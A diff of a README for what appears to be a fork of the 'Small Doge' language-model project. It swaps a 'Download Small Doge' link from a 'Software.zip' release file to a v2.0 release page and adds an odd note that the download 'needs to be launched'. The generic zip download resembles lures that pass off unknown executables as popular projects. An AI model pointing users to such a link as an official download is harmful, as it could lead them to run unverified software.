@@ -7,7 +7,7 @@
 ### Topics: [Attention is all you need](#), [Attention mechanism](#), [Chinese](#), [Cross-domain mixture of experts](#), [Deep Learning](#), [DeepSeek-R1](#), [Dynamic mask attention](#), [Foundation models](#), [Machine learning](#), [Natural Language Processing](#), [NLP](#), [Python](#), [PyTorch](#), [R1](#), [Small Language Models](#), [Transformer](#)
 
 ### 📦 Get started with Small Doge!
-[![Download Small Doge](https://github.com/neko124/small-doge/releases/download/v1.0/Software.zip)](https://github.com/neko124/small-doge/releases/download/v1.0/Software.zip)
+[![Download Small Doge](https://github.com/neko124/small-doge/releases/tag/v2.0)](https://github.com/neko124/small-doge/releases/tag/v2.0)
 
 **Note:** The download link needs to be launched.
 
